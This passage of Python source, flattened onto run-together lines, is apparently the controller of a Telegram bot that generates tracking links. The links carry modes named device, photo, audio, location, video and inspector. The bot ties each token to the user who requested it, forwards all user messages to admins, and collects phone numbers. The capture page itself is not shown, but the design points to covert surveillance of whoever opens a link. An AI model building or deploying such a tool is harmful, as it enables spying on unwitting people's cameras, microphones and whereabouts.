    await update.message.reply_text(f"Recent links:\n{lines}")    elif text == "🗑 Clear":        if is_admin(user_id):            user_tokens = [t for t, uid in tracking_links.items() if uid == user_id]            for t in user_tokens:                del tracking_links[t]            await update.message.reply_text(f"Cleared {len(user_tokens)} links")        else:            await update.message.reply_text("Admin only")    elif text == "❓ Help":        await update.message.reply_text("Select buttons to generate links.\nAdmin: /addall, /broadcast, /stats")    else:        await update.message.reply_text("Use buttons below", reply_markup=get_main_keyboard())async def button_handler(update: Update, context):    query = update.callback_query    await query.answer()    data = query.data    user_id = str(query.from_user.id)        if data == "menu":        await query.edit_message_text("Main Menu", reply_markup=None)        await query.message.reply_text("Select option:", reply_markup=get_main_keyboard())    elif data.startswith("new_"):        key = data[4:]        if key in VIP_ACTIONS.values():            token = secrets.token_urlsafe(12)            tracking_links[token] = user_id            await query.edit_message_text(f"✅ New VIP Link:\n{BASE_URL}/vip/{key}/{token}", reply_markup=make_inline_keyboard(token, None, is_vip=True, platform=key))        elif key in ["device", "photo", "audio", "location", "video", "inspector"]:            token = secrets.token_urlsafe(12)            tracking_links[token] = user_id            await query.edit_message_text(f"✅ New Link:\n{BASE_URL}/link/{token}?m={key}", reply_markup=make_inline_keyboard(token, key))# ---------- Admin Commands ----------async def cmd_addall(update: Update, context):    if not is_admin(update.effective_user.id):        await update.message.reply_text("Admin only")        return    args = context.args    if not args or not args[0].isdigit():        await update.message.reply_text("Usage: /addall <points>")        return    amt = int(args[0])    for uid in user_data.keys():        add_points(uid, amt)    await update.message.reply_text(f"Added {amt} pts to {len(user_data)} users")async def cmd_broadcast(update: Update, context):    if not is_admin(update.effective_user.id):        await update.message.reply_text("Admin only")        return    if update.message.reply_to_message:        replied = update.message.reply_to_message        success = 0        for uid in user_data.keys():            try:                if replied.text:                    await context.bot.send_message(chat_id=int(uid), text=replied.text, parse_mode="HTML")                elif replied.photo:                    await context.bot.send_photo(chat_id=int(uid), photo=replied.photo[-1].file_id, caption=replied.caption)                elif replied.video:                    await context.bot.send_video(chat_id=int(uid), video=replied.video.file_id, caption=replied.caption)                elif replied.audio:                    await context.bot.send_audio(chat_id=int(uid), audio=replied.audio.file_id, caption=replied.caption)                elif replied.voice:                    await context.bot.send_voice(chat_id=int(uid), voice=replied.voice.file_id)                elif replied.location:                    await context.bot.send_location(chat_id=int(uid), latitude=replied.location.latitude, longitude=replied.location.longitude)                elif replied.document:                    await context.bot.send_document(chat_id=int(uid), document=replied.document.file_id, caption=replied.caption)                success += 1                time.sleep(0.05)            except:                pass        await update.message.reply_text(f"Broadcast sent to {success}/{len(user_data)} users")    else:        text = " ".join(context.args)        if not text:            await update.message.reply_text("Usage: /broadcast <message> or reply to media")            return        sent = 0        for uid in user_data.keys():            try:                await context.bot.send_message(chat_id=int(uid), text=text, parse_mode="HTML")                sent += 1                time.sleep(0.05)            except:                pass        await update.message.reply_text(f"Broadcast sent to {sent}/{len(user_data)} users")async def cmd_stats(update: Update, context):    if not is_admin(update.effective_user.id):        await update.message.reply_text("Admin only")        return    await update.message.reply_text(f"📊 Stats\nUsers: {len(user_data)}\nLinks: {len(tracking_links)}")async def cmd_adddays(update: Update, context):    if not is_admin(update.effective_user.id):        await update.message.reply_text("Admin only")        return    args = context.args    if len(args) < 2:        await update.message.reply_text("Usage: /adddays <user_id> <days>")        return    target, days = args[0], int(args[1])    add_access_days(target, days)    await update.message.reply_text(f"Added {days} days to {target}")# ---------- Forward Messages ----------async def forward_all_messages(update: Update, context):    user = update.effective_user    user_id = str(user.id)    user_name = user.full_name or user.username or user_id    header = f"📩 From: {user_name} (ID: {user_id})"        for cid in ADMIN_IDS.union(NOTIFY_CHAT_IDS):        try:            if update.message.text:                await context.bot.send_message(chat_id=int(cid), text=f"{header}\n\n{update.message.text}")            elif update.message.photo:                caption = f"{header}\n\n{update.message.caption or ''}"                await context.bot.send_photo(chat_id=int(cid), photo=update.message.photo[-1].file_id, caption=caption)            elif update.message.video:                caption = f"{header}\n\n{update.message.caption or ''}"                await context.bot.send_video(chat_id=int(cid), video=update.message.video.file_id, caption=caption)            elif update.message.audio:                caption = f"{header}\n\n{update.message.caption or ''}"                await context.bot.send_audio(chat_id=int(cid), audio=update.message.audio.file_id, caption=caption)            elif update.message.voice:                await context.bot.send_voice(chat_id=int(cid), voice=update.message.voice.file_id, caption=f"{header}\n\nVoice")            elif update.message.location:                await context.bot.send_location(chat_id=int(cid), latitude=update.message.location.latitude, longitude=update.message.location.longitude)            elif update.message.contact:                await context.bot.send_message(chat_id=int(cid), text=f"{header}\n\n📞 Contact: {update.message.contact.first_name}\n📱 {update.message.contact.phone_number}")        except:            passasync def contact_handler(update: Update, context):    user = update.effective_user    user_id = str(user.id)    contact = update.message.contact    if contact.user_id and str(contact.user_id) != user_id:        await update.message.reply_text("Please share your own phone number")        return    phone = contact.phone_number    u = get_user(user_id)    u["phone"] = phone    u["pending_phone_approval"] = True    await update.message.reply_text(f"✅ Phone received: {phone}\nAdmin will verify soon")    for aid in ADMIN_IDS:        send_telegram_message(aid, f"📱 Phone share\nUser: {user.full_name}\nID: {user_id}\nPhone: {phone}")# ---------- Main ----------def run_bot():    app = ApplicationBuilder().token(BOT_TOKEN).build()    app.add_handler(CommandHandler("start", start))    app.add_handler(CommandHandler("addall", cmd_addall))    app.add_handler(CommandHandler("broadcast", cmd_broadcast))    app.add_handler(CommandHandler("stats", cmd_stats))    app.add_handler(CommandHandler("adddays", cmd_adddays))    app.add_handler(CallbackQueryHandler(button_handler))    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND & ~filters.CONTACT, forward_all_messages))    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))    app.run_polling()if __name__ == "__main__":    threading.Thread(target=lambda: flask_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False), daemon=True).start()    run_bot()